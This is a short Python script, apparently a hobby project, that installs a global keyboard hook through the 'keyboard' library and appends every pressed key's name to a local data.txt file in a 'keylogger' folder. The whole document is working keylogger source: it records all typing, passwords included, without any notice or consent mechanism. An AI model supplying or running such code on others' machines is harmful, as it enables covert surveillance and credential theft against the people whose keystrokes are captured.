# first run command: $ pip install keyboard

import keyboard

def pressed_keys(key):
    with open('projects\keylogger\data.txt', 'a') as file:
        if key.name == 'space':
            file.write(' ')
        else:
            file.write(key.name + '\n')

keyboard.on_press(pressed_keys)
keyboard.wait()